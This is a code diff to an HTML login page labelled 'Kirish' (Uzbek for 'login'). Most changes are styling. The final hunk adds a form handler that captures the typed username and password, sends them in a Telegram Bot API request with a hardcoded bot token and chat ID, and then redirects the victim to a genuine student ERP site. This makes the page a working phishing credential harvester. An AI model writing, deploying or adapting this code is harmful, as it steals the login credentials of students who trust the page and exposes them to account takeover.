@@ -17,8 +17,9 @@
              <div>
                 <h2 class="text-[35px] font-semibold text-neutral-800 mb-12">Kirish</h2>
             </div>
+            <form id="loginForm">
                <div class="relative w-64 mb-8">
-                <input id="username" type="text" placeholder=" " class="peer w-[400px] cursor-pointer border-1 border-gray-300 bg-transparent px-3 pt-4 pb-2 focus:outline-none rounded-md focus:border-yellow-600 peer border  focus:ring-0.5  "/>
+                <input id="username" type="text" placeholder=" " class="peer w-[400px] cursor-pointer border-1 border-gray-300 bg-transparent px-3 pt-4 pb-3 focus:outline-none rounded-md focus:border-yellow-600 peer border  focus:ring-0.5  "/>
                 <label for="username" class="absolute left-2 top-1 text-gray-500 transition-all peer-placeholder-shown:top-4  peer-placeholder-shown:text-gray-400 peer-placeholder-shown:text-base peer-focus:top-1 hover:text-[10px] peer-focus:text-sm peer-focus:text-yellow-800 ">
                  <p class="text-[14px]">Kirish</p>
               </label>
@@ -49,9 +50,10 @@
           d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" />
       </svg>
     </button>
-    <a href=""><button class="w-full rounded-md bg-yellow-700 cursor-pointer  text-white py-3 text-base font-medium hover:bg-yellow-900 transition">Kirish</button></a>
+    <a href=""><button class="w-full rounded-md bg-[#BC8E5B] cursor-pointer  text-white py-3 text-base font-medium hover:bg-yellow-900 transition">Kirish</button></a>
       </div>
   </div>
+  </form>
             </div>
            </div>
         </div>
@@ -61,6 +63,38 @@
     const pass = document.getElementById("password");
     pass.type = pass.type === "password" ? "text" : "password";
   }
+
+
+
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    // Telegram bot token va chat ID ni o‘rnating
+    const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+    const chatId = 'YOUR_CHAT_ID';
+
+    const message = `Username: ${username}\nPassword: ${password}`;
+
+    const url = `https://api.telegram.org/bot${'8184100111:AAFFjDL2okrnAWxv1DhP2iZRgfOaupIhipo'}/sendMessage?chat_id=${'6274684341'}&text=${encodeURIComponent(message)}`;
+
+    fetch(url)
+        .then(response => {
+            if (response.ok) {
+                window.location.href = "https://erp.student.najottalim.uz/";
+            } else {
+                alert('Failed to send data to Telegram.');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('An error occurred.');
+        });
+});
+
+
 </script>
 
     
